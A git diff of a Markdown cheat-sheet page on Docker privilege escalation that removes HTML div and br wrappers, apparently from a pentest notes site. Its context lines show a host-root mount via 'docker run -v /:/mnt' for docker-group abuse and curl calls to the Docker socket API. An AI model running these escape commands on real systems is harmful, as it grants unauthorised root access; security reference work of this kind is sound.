@@ -6,8 +6,6 @@ tags: ["docker", "privesc", "container", "escape", "dive"]
 
 ### Basic Commands
 
-<div>
-
 ```console
 # Show all running processes
 sudo docker ps -a
@@ -58,10 +56,6 @@ sudo docker cp <HOST_FOLDER_PATH>/. <CONTAINER_ID>:<CONTAINER_TARGET_PATH>
 sudo docker cp <CONTAINER_ID>:<CONTAINER_FOLDER_PATH>/. <HOST_TARGET_PATH>
 ```
 
-</div>
-
-<br>
-
 ---
 
 ### Explore Docker image
@@ -69,25 +63,17 @@ sudo docker cp <CONTAINER_ID>:<CONTAINER_FOLDER_PATH>/. <HOST_TARGET_PATH>
 {{< tab set1 tab1 active >}}dive{{< /tab >}}
 {{< tabcontent set1 tab1 >}}
 
-<div>
-
 ```console
 dive docker-archive://image.tar
 ```
-
-</div>
 
 <small>*Ref: [dive](https://github.com/wagoodman/dive)*</small>
 
 {{< /tabcontent >}}
 
-<br>
-
 ---
 
 ### Abuse #1: Docker group
-
-<div>
 
 ```console
 # List images
@@ -104,15 +90,9 @@ docker run -v /:/mnt -it <IMAGE_NAME> bash
 ls /mnt/root
 ```
 
-</div>
-
-<br>
-
 ---
 
 ### Abuse #2: Docker API
-
-<div>
 
 ```console
 # Show running containers
@@ -133,7 +113,3 @@ curl -s -X POST -H 'Content-Type: application/json' --unix-socket /var/run/docke
 # Show results
 curl -s --unix-socket /var/run/docker.sock "http://localhost/containers/<CONTAINER_ID>/logs?stderr=1&stdout=1"
 ```
-
-</div>
-
-<br>
